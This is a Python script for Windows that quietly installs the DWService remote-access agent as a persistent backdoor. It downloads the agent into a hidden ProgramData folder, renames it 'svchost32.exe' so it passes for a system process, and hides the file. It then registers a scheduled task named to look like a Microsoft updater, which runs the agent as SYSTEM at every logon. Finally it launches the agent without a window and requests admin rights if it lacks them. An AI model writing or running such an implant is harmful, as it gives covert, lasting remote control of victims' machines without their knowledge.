import os
import shutil
import ctypes
import urllib.request
import subprocess

# Configuration
hidden_folder = r"C:\ProgramData\Microsoft\WinHelper"
dwagent_url = "https://www.dwservice.net/download/dwagent.exe"
hidden_exe = os.path.join(hidden_folder, "svchost32.exe")
task_name = "Microsoft\\Win32UpdateHost"

def hide_file(filepath):
    subprocess.call(['attrib', '+h', '+s', filepath])

def create_hidden_folder(path):
    if not os.path.exists(path):
        os.makedirs(path)
        hide_file(path)

def download_dwagent():
    urllib.request.urlretrieve(dwagent_url, hidden_exe)
    hide_file(hidden_exe)

def create_task():
    subprocess.call([
        'schtasks', '/create',
        '/tn', task_name,
        '/tr', hidden_exe,
        '/sc', 'onlogon',
        '/rl', 'highest',
        '/f',
        '/ru', 'SYSTEM'
    ])

def run_silently():
    subprocess.Popen(hidden_exe, creationflags=subprocess.CREATE_NO_WINDOW)

# Main Execution
def main():
    create_hidden_folder(hidden_folder)
    download_dwagent()
    create_task()
    run_silently()

if __name__ == "__main__":
    # Elevate privileges
    if ctypes.windll.shell32.IsUserAnAdmin():
        main()
    else:
        # Relaunch as admin
        ctypes.windll.shell32.ShellExecuteW(None, "runas", __file__, None, None, 1)
